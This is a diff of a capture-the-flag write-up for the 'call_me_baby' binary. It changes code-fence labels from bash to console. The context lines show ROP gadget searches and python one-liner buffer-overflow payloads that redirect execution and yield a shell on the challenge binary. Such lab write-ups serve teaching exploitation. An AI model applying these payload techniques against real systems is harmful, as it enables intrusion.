@@ -10,7 +10,7 @@ http://internetcest.fun:13337
 
 [This binary](./call_me_baby) is given. Let's try it out :
 
-```bash
+```console
 $ ./call_me_baby 
 Write your love letter: 
 test
@@ -187,7 +187,7 @@ To modify the register we can use [gadgets](./https://ir0nstone.gitbook.io/notes
 
 Since rdi is used to store the argument given to call_me(), let's use ROPGadgets to find a way to modify rdi :
 
-```bash
+```console
 $ ROPgadget --binary call_me_baby | grep 'rdi'
 0x0000000000401165 : mov dl, byte ptr [rbp + 0x48] ; mov ebp, esp ; pop rdi ; ret
 0x0000000000401168 : mov ebp, esp ; pop rdi ; ret
@@ -360,7 +360,7 @@ error in re-setting breakpoint 5: no symbol "gadgets" in current context.
 
 Gdb is trying to run another process. Let's try our payload on the binary the same way we did on the previous challenge :
 
-```bash
+```console
 $ (python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*64+b"\x62\x61\x62\x79"+b"\x00"*4+b"\x66\x11\x40\x00"+b"\x00"*4+b"\x8a\x11\x40\x00"+b"\x00"*4)' ; tee) | ./call_me_baby
 Write your love letter: 
 whoami
@@ -428,7 +428,7 @@ Error in re-setting breakpoint 2: No symbol "call_me" in current context.
 
 Gdb is trying to start a new process. Let's test our payload on the binary :
 
-```bash
+```console
 $ (python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*72+b"\xb0\x11\x40\x00"+b"\x00"*4)' ; tee) | ./call_me_baby 
 Write your love letter: 
 whoami
@@ -447,7 +447,7 @@ Same as before, let's use some python scripts to send our payload.
 
 [Script](./exploit1.py)
 
-```bash
+```console
 $ python3 exploit1.py 
 b'Write your love letter: \n'
 whoami
